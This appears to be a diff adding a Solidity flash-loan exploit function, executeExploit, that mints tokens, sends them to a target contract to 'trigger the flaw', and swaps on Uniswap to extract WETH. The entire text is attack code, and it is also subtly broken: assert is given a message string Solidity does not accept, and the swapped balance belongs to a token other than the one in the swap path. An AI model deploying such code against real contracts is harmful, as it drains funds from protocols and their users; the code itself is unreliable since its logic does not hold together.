@@ -1,0 +1,35 @@
+```solidity
+<executeExploitCode>
+function executeExploit(uint256 amount) internal {
+    // Step 1: Mint tokens to exploit the system
+    uint256 mintAmount = 100000 * 10 ** 9; // mint an arbitrary amount of tokens if possible
+    ICoinToken(token).mint(address(this), mintAmount);
+
+    // Step 2: Transfer to the target contract to trigger the flaw
+    IERC20(token).transfer(target, mintAmount);
+
+    // Step 3: Prepare for flash loan repayment by performing any necessary operations
+    uint256 valuableTokenBalance = valuableToken.balanceOf(address(this));
+    console.log("Token balance before the swap: %s", valuableTokenBalance);
+
+    // Step 4: Swap tokens in the Uniswap pair to gain more WETH
+    address[] memory path = new address[](2);
+    path[0] = token; // token received from minting
+    path[1] = uniswapRouter.WETH(); // swapping for WETH
+
+    IUniswapV2Router(uniswapRouter).swapExactTokensForTokensSupportingFeeOnTransferTokens(
+        valuableTokenBalance,
+        0, // amount out min
+        path,
+        address(this),
+        block.timestamp + 300
+    );
+
+    // Step 5: Ensure we have enough WETH for the flashloan
+    uint256 wethBalance = IERC20(uniswapRouter.WETH()).balanceOf(address(this));
+    console.log("WETH balance after swap: %s", wethBalance);
+
+    assert(wethBalance > amount, "Not enough WETH to repay the flash loan.");
+}
+</executeExploitCode>
+```
